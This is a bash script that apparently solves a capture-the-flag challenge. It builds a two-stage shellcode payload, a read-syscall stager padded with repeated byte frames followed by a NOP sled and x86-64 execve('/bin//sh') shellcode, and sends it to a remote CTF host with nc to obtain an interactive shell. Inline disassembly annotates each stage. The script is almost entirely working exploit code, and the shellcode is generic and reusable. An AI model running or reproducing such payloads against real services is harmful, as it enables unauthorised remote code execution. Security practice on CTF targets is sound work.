#!/bin/bash

if [[ -e payload_7_1 ]]; then
    rm payload_7_1
fi
if [[ -e payload_7_2 ]]; then
    rm payload_7_2
fi

host="ctf.adl.tw"
port="10004"


frame="\x0c\x87\x63\x01\x01\x01"


shellcode_sys_read_part1="\x0c\x87\x63\xd0\x89\xdb"
: << Instruction
0c 87                   or     al, 0x87
63 d0                   movsxd edx, eax  # ssign buffer size, by the way this line can be executed, but it can't be assembled by nasm.
89 db                   mov    ebx, ebx  # do nothing, regarded as 2 bytes nop
Instruction

shellcode_sys_read_part2="\x0c\x87\x63\xc3\x0f\x05"
: << Instruction
0c 87                   or     al, 0x87
63 c3                   movsxd eax, ebx  # rax clear, by the way this line can be executed, but it can't be assembled by nasm.
0f 05                   syscall
Instruction

echo -ne $shellcode_sys_read_part1$shellcode_sys_read_part2$(printf "$frame%.0s" $(seq 1 23)) > payload_7_1

shellcode_sys_exeve="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
: << Instruction
48 31 f6                xor    rsi,rsi
56                      push   rsi
48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f2f6e69622f  # encoded from "/bin//sh"
2f 73 68
57                      push   rdi
54                      push   rsp
5f                      pop    rdi
6a 3b                   push   0x3b
58                      pop    rax
99                      cdq
0f 05                   syscall
Instruction

echo -ne $(printf "\x90%.0s" $(seq 1 12))$shellcode_sys_exeve > payload_7_2

(cat payload_7_1; cat payload_7_2; cat - ) | nc $host $port
